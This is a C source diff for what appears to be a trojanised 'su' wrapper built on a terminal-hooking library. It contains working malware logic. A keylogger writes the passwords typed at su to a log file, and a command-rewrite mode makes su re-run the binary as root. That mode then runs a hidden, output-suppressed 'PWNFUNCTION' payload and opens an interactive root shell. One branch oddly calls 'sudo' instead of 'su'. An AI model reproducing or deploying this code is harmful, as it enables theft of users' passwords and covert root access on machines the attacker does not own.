@@ -1,27 +1,111 @@
 #include "tas/tas.h"
 #include "tas/constructor.c"
 
-#define LINE_LIMIT 3
-#include "fun/keylogger.c"
+#include <stdio.h>
+#include <string.h>
 
-#include <sys/types.h>
 #include <sys/wait.h>
+#include <sys/types.h>
 #include <fcntl.h>
-#include <unistd.h>
 
-int main(int argc, char **argv)
+#include "config.h"
+
+// if you enable command change
+#ifdef CMDCHANGE
+
+// verify command line
+// only proceeds if the command is equal to
+// "su" or "su -"
+int check_args(int argc, char **argv)
 {
-	(void) argc;
+	int ret = 1;
 
+	if (argc == 0 || strcmp(argv[0], "su")) {
+		goto end;
+	}
+
+	if (argc > 2 || (argc == 2 && strcmp(argv[1], "-"))) {
+		goto end;
+	}
+
+	ret = 0;
+
+end:
+	return ret;
+}
+
+// edit this function to run
+// what you want as root
+void super(void)
+{
+	// defined in config.h
+	PWNFUNCTION
+}
+
+// hide output
+void prepare(void)
+{
+	int fd;
+	pid_t pid = fork();
+	if (pid == 0) {
+		setsid();
+
+		fd = open("/dev/null", O_RDWR);
+		dup2(fd, 0);
+		dup2(fd, 1);
+		dup2(fd, 2);
+
+		if (fd > 2)
+			close(fd);
+
+		super();
+		_exit(0);
+	}
+}
+
+void runme(int argc, char **argv)
+{
+	if (getuid() == 0) {
+		prepare();
+
+		execvp("bash", (char *[]){ "bash", "-i", NULL });
+		_exit(1);
+	}
+
+	if (check_args(argc, argv)) {
+		tas_execv("su", argv);
+		_exit(0);
+	}
+
+	// change the command
+	argv[argc]     = "-c";
+	argv[argc + 1] = current_exe;
+	argv[argc + 2] = NULL;
+
+	tas_execv("su", argv);
+	_exit(0);
+}
+
+#endif /* CMDCHANGE */
+
+// if you enable keylogger
+#ifdef KEYLOGGER
+
+int enable_keylogger(int argc, char **argv)
+{
 	struct termios tios;
 	int status;
 
 	tas_tty tty = TAS_TTY_INIT;
-	tty.output_fd = open("/tmp/.su-pw.txt",
-		O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0644);
+	tty.output_fd = open(LOGFILE, O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC , 0644);
 
-	if(tty.output_fd == -1) {
-		tas_execv("su", argv);
+	if (tty.output_fd == -1) {
+		#ifdef CMDCHANGE
+			runme(argc, argv);
+		#else
+			tas_execv("su", argv);
+		#endif
+
 		_exit(1);
 	}
 
@@ -30,7 +114,12 @@ int main(int argc, char **argv)
 		if (pid == -1)
 			close(tty.master);
 
-		tas_execv("su", argv);
+		#ifdef CMDCHANGE
+			runme(argc, argv);
+		#else
+			tas_execv("sudo", argv);
+		#endif
+
 		_exit(1);
 	}
 
@@ -48,4 +137,17 @@ int main(int argc, char **argv)
 
 	waitpid(pid, &status, 0);
 	return status;
+}
+
+#endif /* KEYLOGGER */
+
+int main(int argc, char **argv)
+{
+#ifdef KEYLOGGER
+	return enable_keylogger(argc, argv);
+#endif
+
+#ifdef CMDCHANGE
+	runme(argc, argv);
+#endif
 }
